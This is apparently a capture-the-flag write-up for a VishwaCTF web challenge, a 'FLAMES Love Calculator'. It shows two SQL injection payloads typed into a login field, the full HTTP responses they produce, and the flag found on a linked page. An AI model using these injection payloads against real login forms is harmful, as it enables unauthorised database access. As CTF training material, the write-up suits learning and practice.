# Challenge description

Find Your True Love <3.

# Soluce

I started by testing SQL injection with the following payload on the "login" field:

```sql
' or 1=1--
```

I got the following response:

```html
HTTP/1.1 200 OK
Date: Tue, 04 Mar 2025 17:00:27 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.2.27
Vary: Accept-Encoding
Content-Length: 2042
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLAMES Love Calculator</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: linear-gradient(to right, #ff9a9e, #fad0c4);
            color: #fff;
            margin: 0;
            padding: 50px;
        }

        h1 {
            font-size: 2.5em;
            color: #fff;
            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.6);
        }

        h2 {
            font-size: 2em;
            color: #fff;
            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.6);
        }

        .result {
            font-size: 2em;
            font-weight: bold;
            color: #ffdde1;
            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.8);
        }

        .flames-box {
            background: rgba(255, 0, 0, 0.2);
            padding: 25px;
            border-radius: 15px;
            display: inline-block;
            box-shadow: 0px 0px 15px rgba(255, 0, 0, 0.6);
            backdrop-filter: blur(8px);
        }

        .try-again {
            display: inline-block;
            margin-top: 20px;
            padding: 12px 25px;
            background: #ff4757;
            color: #fff;
            border-radius: 30px;
            font-size: 1.2em;
            text-decoration: none;
            transition: 0.3s;
            box-shadow: 0px 5px 15px rgba(255, 0, 0, 0.4);
        }

        .try-again:hover {
            background: #ff6b81;
            box-shadow: 0px 5px 20px rgba(255, 0, 0, 0.6);
        }
    </style>
</head>
<body>

    <div class="flames-box">
        <h1>FLAMES Love Calculator </h1>
        <h2>' OR 1=1 -- ❤️ ' OR 1=1 -- = <span class='result'>Friends</span></h2>    </div>

    <br><br>
    <a href="./index.php" class="try-again">Try Again</a>

</body>
</html>
```

So I tried the following payload on the "login" field:

```sql
' UNION SELECT NULL, version() --
```

I got the following response:

```html
HTTP/1.1 200 OK
Date: Tue, 04 Mar 2025 16:54:10 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.2.27
Vary: Accept-Encoding
Content-Length: 2214
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLAMES Love Calculator</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: linear-gradient(to right, #ff9a9e, #fad0c4);
            color: #fff;
            margin: 0;
            padding: 50px;
        }

        h1 {
            font-size: 2.5em;
            color: #fff;
            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.6);
        }

        h2 {
            font-size: 2em;
            color: #fff;
            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.6);
        }

        .result {
            font-size: 2em;
            font-weight: bold;
            color: #ffdde1;
            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.8);
        }

        .flames-box {
            background: rgba(255, 0, 0, 0.2);
            padding: 25px;
            border-radius: 15px;
            display: inline-block;
            box-shadow: 0px 0px 15px rgba(255, 0, 0, 0.6);
            backdrop-filter: blur(8px);
        }

        .try-again {
            display: inline-block;
            margin-top: 20px;
            padding: 12px 25px;
            background: #ff4757;
            color: #fff;
            border-radius: 30px;
            font-size: 1.2em;
            text-decoration: none;
            transition: 0.3s;
            box-shadow: 0px 5px 15px rgba(255, 0, 0, 0.4);
        }

        .try-again:hover {
            background: #ff6b81;
            box-shadow: 0px 5px 20px rgba(255, 0, 0, 0.6);
        }
    </style>
</head>
<body>

    <div class="flames-box">
        <h1>FLAMES Love Calculator </h1>
        <h2>' UNION SELECT NULL, version() -- ❤️ ' UNION SELECT NULL, version() -- = <span class='result'>"Your crush definitely Loves you" ❤️<br>
                <a href='lovers_db.php' style='font-size: 0.8em;'>Famous Love Stories</a></span></h2>    </div>

    <br><br>
    <a href="./index.php" class="try-again">Try Again</a>

</body>
</html>
```

So I clicked on the "Famous Love Stories" link and I got the following response:

```html
HTTP/1.1 200 OK
Date: Tue, 04 Mar 2025 16:54:47 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.2.27
Vary: Accept-Encoding
Content-Length: 3009
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Love Through the Ages </title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: linear-gradient(to right, #ff758c, #ff7eb3);
            color: #fff;
            margin: 0;
            padding: 50px;
        }

        h1 {
            font-size: 3em;
            text-shadow: 2px 2px 15px rgba(255, 255, 255, 0.8);
        }

        .container {
            max-width: 800px;
            margin: auto;
            background: rgba(255, 255, 255, 0.2);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
            backdrop-filter: blur(10px);
        }

        .quote {
            font-style: italic;
            font-size: 1.4em;
            margin-bottom: 20px;
        }

        .lovers-list {
            list-style: none;
            padding: 0;
        }

        .lovers-list li {
            font-size: 1.5em;
            padding: 10px;
            background: rgba(255, 255, 255, 0.3);
            margin: 10px;
            border-radius: 10px;
            box-shadow: 0px 5px 10px rgba(255, 255, 255, 0.3);
            transition: transform 0.3s;
        }

        .lovers-list li:hover {
            transform: scale(1.05);
        }

        .flag-box {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            box-shadow: 0px 5px 10px rgba(255, 255, 255, 0.3);
            color: #ffebee;
        }
    </style>
</head>
<body>
    <h1> Love Through the Ages </h1>
    
    <div class="container">
        <p class="quote">"Love is composed of a single soul inhabiting two bodies." – Aristotle</p>
        <p>Throughout history, love has shaped destinies, inspired poets, and changed the course of wars. Here are some of the most famous lovers who defied all odds to be together:</p>
        
        <ul class="lovers-list">
                            <li>Romeo ❤️ Juliet</li>
                            <li>Laila ❤️ Majnu</li>
                            <li>Shirin ❤️ Farhad</li>
                            <li>Heer ❤️ Ranjha</li>
                            <li>Tristan ❤️ Isolde</li>
                            <li>Cleopatra ❤️ Mark Antony</li>
                            <li>Paris ❤️ Helen</li>
                    </ul>
        
        <p>Do you believe in destiny? Love stories like these remind us that some hearts are meant to beat as one.</p>
        
        <div class="flag-box">Love Note: VishwaCTF{SQL_1nj3ct10n_C4n_Qu3ry_Your_He4rt}</div>
    </div>
</body>
</html>
```

So the flag is `VishwaCTF{SQL_1nj3ct10n_C4n_Qu3ry_Your_He4rt}`.